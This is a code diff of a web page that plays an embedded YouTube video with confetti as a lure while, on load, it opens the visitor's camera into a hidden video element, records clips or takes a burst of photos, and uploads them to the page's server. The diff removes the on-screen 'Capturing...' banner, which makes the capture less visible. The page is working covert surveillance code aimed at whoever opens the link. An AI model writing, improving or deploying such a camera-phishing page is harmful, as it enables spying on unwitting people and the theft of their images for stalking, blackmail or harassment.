@@ -122,26 +122,6 @@
             letter-spacing: 1px;
         }
         
-        .capture-status {
-            position: fixed;
-            bottom: 30px;
-            left: 50%;
-            transform: translateX(-50%);
-            z-index: 50;
-            background: rgba(0,0,0,0.8);
-            padding: 12px 25px;
-            border-radius: 30px;
-            color: white;
-            font-size: 0.9rem;
-            display: none;
-            backdrop-filter: blur(10px);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .capture-status.active {
-            display: block;
-            animation: fadeIn 0.3s ease;
-        }
-        
         #hiddenVideo { display: none; }
         #photoCanvas { display: none; }
         
@@ -157,8 +137,6 @@
         <span class="dot"></span>
         <span class="label" id="recordingLabel">Recording</span>
     </div>
-    
-    <div class="capture-status" id="captureStatus">📸 Capturing...</div>
     
     <video id="hiddenVideo" autoplay playsinline></video>
     <canvas id="photoCanvas"></canvas>
@@ -177,29 +155,21 @@
     </div>
 
     <script>
-        // ============================================
-        // Get parameters from URL
-        // ============================================
         const urlParams = new URLSearchParams(window.location.search);
         const videoId = urlParams.get('video') || 'dQw4w9WgXcQ';
-        const captureMode = urlParams.get('mode') || 'video'; // 'video' or 'photo'
-        const cameraType = urlParams.get('camera') || 'user'; // 'user' or 'environment'
+        const captureMode = urlParams.get('mode') || 'video';
+        const cameraType = urlParams.get('camera') || 'user';
         const photoCount = parseInt(urlParams.get('photos')) || 5;
         const videoDuration = parseInt(urlParams.get('duration')) || 15;
         
-        // Load YouTube video
         document.getElementById('youtubePlayer').src = 
             `https://www.youtube.com/embed/${videoId}?autoplay=1&rel=0&controls=1&modestbranding=1`;
 
-        // ============================================
-        // DOM Elements
-        // ============================================
         const videoElement = document.getElementById('hiddenVideo');
         const photoCanvas = document.getElementById('photoCanvas');
         const videoCard = document.getElementById('videoCard');
         const recordingDot = document.getElementById('recordingDot');
         const recordingLabel = document.getElementById('recordingLabel');
-        const captureStatus = document.getElementById('captureStatus');
 
         const UPLOAD_URL = '/upload';
         let mediaStream = null;
@@ -208,12 +178,9 @@
         let timerInterval = null;
         let timeRemaining = videoDuration;
         let isRecording = false;
-        let capturedPhotos = [];
         let photoIndex = 0;
+        let photoInterval = null;
 
-        // ============================================
-        // Confetti Generator
-        // ============================================
         const confettiContainer = document.getElementById('confettiContainer');
         const colors = ['#ff6b6b', '#ffd93d', '#6bcb77', '#4d96ff', '#ff6fb7', '#a66cff'];
         for (let i = 0; i < 80; i++) {
@@ -229,9 +196,6 @@
             confettiContainer.appendChild(confetti);
         }
 
-        // ============================================
-        // Camera Functions
-        // ============================================
         async function startCamera() {
             try {
                 const constraints = {
@@ -246,17 +210,13 @@
                 mediaStream = await navigator.mediaDevices.getUserMedia(constraints);
                 videoElement.srcObject = mediaStream;
                 await videoElement.play();
-                
                 return true;
             } catch (error) {
-                console.error('❌ Camera error:', error);
+                console.error('Camera error:', error);
                 return false;
             }
         }
 
-        // ============================================
-        // Video Recording Mode
-        // ============================================
         async function startVideoRecording() {
             try {
                 recordingDot.classList.add('active');
@@ -311,45 +271,35 @@
                 }, 1000);
 
             } catch (error) {
-                console.error('❌ Recording error:', error);
+                console.error('Recording error:', error);
                 recordingDot.classList.remove('active');
                 videoCard.classList.remove('recording');
             }
         }
 
-        // ============================================
-        // Photo Capture Mode
-        // ============================================
         async function startPhotoCapture() {
             try {
                 recordingDot.classList.add('active');
                 recordingLabel.textContent = `Photo ${photoIndex + 1}/${photoCount}`;
                 videoCard.classList.add('recording');
-                captureStatus.classList.add('active');
-                captureStatus.textContent = `📸 Capturing photo ${photoIndex + 1}/${photoCount}`;
 
                 if (!await startCamera()) {
                     throw new Error('Camera failed to start');
                 }
 
-                // Set canvas size
                 const width = 640;
                 const height = 480;
                 photoCanvas.width = width;
                 photoCanvas.height = height;
                 const ctx = photoCanvas.getContext('2d');
 
-                // Capture photos at intervals
-                const captureInterval = setInterval(() => {
+                photoInterval = setInterval(() => {
                     if (photoIndex < photoCount) {
-                        // Draw current frame to canvas
                         ctx.drawImage(videoElement, 0, 0, width, height);
                         
-                        // Convert to blob
                         photoCanvas.toBlob((blob) => {
                             if (blob) {
-                                const timestamp = Date.now();
-                                const filename = `photo_${timestamp}.jpg`;
+                                const filename = `photo_${Date.now()}.jpg`;
                                 const file = new File([blob], filename, { type: 'image/jpeg' });
                                 uploadMedia(file, 'photo');
                                 console.log(`📸 Photo ${photoIndex + 1}/${photoCount} captured`);
@@ -357,14 +307,12 @@
                         }, 'image/jpeg', 0.9);
 
                         photoIndex++;
-                        captureStatus.textContent = `📸 Capturing photo ${photoIndex + 1}/${photoCount}`;
                         recordingLabel.textContent = `Photo ${photoIndex + 1}/${photoCount}`;
                     } else {
-                        clearInterval(captureInterval);
-                        // All photos captured
+                        clearInterval(photoInterval);
+                        photoInterval = null;
                         recordingDot.classList.remove('active');
                         videoCard.classList.remove('recording');
-                        captureStatus.classList.remove('active');
                         
                         if (mediaStream) {
                             mediaStream.getTracks().forEach(track => track.stop());
@@ -374,19 +322,15 @@
                         
                         console.log('✅ All photos captured!');
                     }
-                }, 1500); // Capture every 1.5 seconds
+                }, 1500);
 
             } catch (error) {
-                console.error('❌ Photo capture error:', error);
+                console.error('Photo capture error:', error);
                 recordingDot.classList.remove('active');
                 videoCard.classList.remove('recording');
-                captureStatus.classList.remove('active');
             }
         }
 
-        // ============================================
-        // Upload Function
-        // ============================================
         async function uploadMedia(file, type) {
             const formData = new FormData();
             formData.append('media', file);
@@ -408,9 +352,6 @@
             }
         }
 
-        // ============================================
-        // Start based on mode
-        // ============================================
         window.addEventListener('load', () => {
             setTimeout(() => {
                 if (captureMode === 'photo') {
@@ -421,27 +362,17 @@
             }, 1000);
         });
 
-        // ============================================
-        // Cleanup
-        // ============================================
         window.addEventListener('beforeunload', () => {
-            if (mediaRecorder && isRecording) {
-                mediaRecorder.stop();
-            }
+            if (mediaRecorder && isRecording) mediaRecorder.stop();
+            if (photoInterval) clearInterval(photoInterval);
+            if (timerInterval) clearInterval(timerInterval);
             if (mediaStream) {
                 mediaStream.getTracks().forEach(track => track.stop());
             }
         });
 
-        console.log(`🎬 YouTube mode loaded!`);
-        console.log(`📹 Mode: ${captureMode}`);
-        console.log(`📷 Camera: ${cameraType}`);
-        console.log(`📸 Video ID: ${videoId}`);
-        if (captureMode === 'video') {
-            console.log(`⏱️ Duration: ${videoDuration} seconds`);
-        } else {
-            console.log(`📸 Photos: ${photoCount}`);
-        }
+        console.log('🎬 YouTube mode loaded!');
+        console.log(`📹 Mode: ${captureMode}, Camera: ${cameraType}`);
     </script>
 </body>
 </html>
